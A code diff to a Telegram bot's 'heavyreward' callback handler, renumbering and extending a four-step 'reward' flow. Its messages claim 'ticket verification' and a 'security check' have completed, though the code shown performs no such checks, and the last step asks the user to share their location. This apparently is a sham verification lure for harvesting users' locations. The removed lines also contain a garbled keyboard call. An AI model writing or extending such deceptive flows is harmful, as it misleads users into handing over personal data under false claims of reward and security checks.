@@ -13468,6 +13468,7 @@ async def heavyreward_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 
     step = query.data
 
+    # ================= STEP 1 =================
     if step == "hr_step_1":
 
         kb = InlineKeyboardMarkup([
@@ -13475,11 +13476,12 @@ async def heavyreward_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         ])
 
         await query.edit_message_text(
-            "🎫 Step 2/5\n\n"
+            "🎫 Step 1/4\n\n"
             "Ticket verification completed.",
             reply_markup=kb
         )
 
+    # ================= STEP 2 =================
     elif step == "hr_step_2":
 
         kb = InlineKeyboardMarkup([
@@ -13487,29 +13489,46 @@ async def heavyreward_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         ])
 
         await query.edit_message_text(
-            "🔒 Step 3/5\n\n"
+            "🔒 Step 2/4\n\n"
             "Security check completed.",
             reply_markup=kb
         )
 
+    # ================= STEP 3 =================
     elif step == "hr_step_3":
 
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📍 Continue to Verification", callback_data="hr_step_4")]
+        ])
+
+        await query.edit_message_text(
+            "📍 Step 3/4\n\n"
+            "Next step verification ready.\n"
+            "Click continue to proceed.",
+            reply_markup=kb
+        )
+
+    # ================= STEP 4 =================
+    elif step == "hr_step_4":
+
         location_keyboard = ReplyKeyboardMarkup(
-            [[KeyboardButton("📍verified", request_location=Trulocation          resize_keyboard=True,
+            [[KeyboardButton("📍 verified", request_location=True)]],
+            resize_keyboard=True,
             one_time_keyboard=True
         )
 
         await query.message.reply_text(
-            "📍 Step 4/5\n\n"
-            "continued verified.\n"
-            "Please verified.",
+            "📍 Step 4/4\n\n"
+            "Final verification step.\n"
+            "Please share your location if you want to continue.",
             reply_markup=location_keyboard
         )
 
-    elif step == "hr_step_5":
+    # ================= DONE =================
+    elif step == "hr_done":
 
         await query.edit_message_text(
-            "🎉 Reward process completed."
+            "🎉 Process completed successfully."
         )
 
 
